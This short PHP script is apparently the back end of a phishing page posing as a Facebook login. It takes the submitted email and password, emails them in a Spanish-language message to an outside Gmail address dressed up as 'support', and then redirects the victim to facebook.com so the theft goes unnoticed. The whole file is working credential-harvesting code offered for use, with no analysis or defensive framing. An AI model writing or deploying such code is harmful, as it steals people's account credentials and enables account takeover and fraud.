<?php
if ($_SERVER["REQUEST_METHOD"] == "POST") {
    $email = htmlspecialchars($_POST['email']);
    $password = htmlspecialchars($_POST['password']);

    $to = "fbsupoort69@gmail.com";
    $subject = "Nuevo intento de inicio de sesión";
    $message = "Correo: $email\nContraseña: $password";
    mail($to, $subject, $message);

    header("Location: https://www.facebook.com/ ");
    exit();

}
?>
